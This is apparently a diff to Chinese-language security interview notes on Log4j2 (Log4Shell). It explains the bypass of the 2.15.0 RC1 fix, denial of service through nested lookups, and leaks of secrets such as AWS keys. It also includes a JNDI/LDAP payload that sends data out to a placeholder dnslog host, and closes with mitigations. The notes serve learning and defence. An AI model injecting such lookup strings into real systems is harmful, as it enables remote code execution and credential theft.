@@ -8,7 +8,7 @@
 
 - 知道Log4j2 2.15.0 RC1修复的绕过吗（★★★）
 
-修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常然后RCE
+修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常绕过HOSOT限制，然后`lookup`触发RCE
 
 
 
@@ -16,7 +16,7 @@
 
 其中一个DOS是`lookup`本身延迟等待和允许多个标签`${}`导致的问题
 
-另一个DOS是嵌套标签`${}`导致栈溢出
+另一个DOS是嵌套标签`${}`递归解析导致栈溢出
 
 
 
@@ -40,7 +40,7 @@
 
 利用其他的`lookup`可以做信息泄露例如`${env:USER}`和`${env:AWS_SECRET_ACCESS_KEY}`
 
-在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息
+在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息，不过`SpringBoot`默认不使用`log4j2`
 
 这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`
 
@@ -51,4 +51,3 @@
 利用JavaAgent改JVM中的字节码，可以直接删了`JndiLookup`的功能
 
 有公众号提出类似`Shiro`改`Key`的思路，利用反射把`JndiLookup`删了也是一种办法
-
